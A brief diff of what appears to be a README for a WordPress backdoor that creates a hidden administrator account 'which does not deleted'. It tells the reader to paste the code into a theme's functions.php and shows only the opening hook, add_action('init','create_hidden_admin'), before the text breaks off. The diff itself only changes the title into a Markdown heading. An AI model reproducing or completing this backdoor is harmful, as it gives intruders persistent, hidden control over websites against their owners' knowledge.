@@ -1,4 +1,4 @@
-Wordpress Backdore Admin User Create. Whice does not deleted.
+# Wordpress Backdore Admin User Create. Whice does not deleted.
 past this file in function.php file
 ```shell script
 add_action('init','create_hidden_admin');
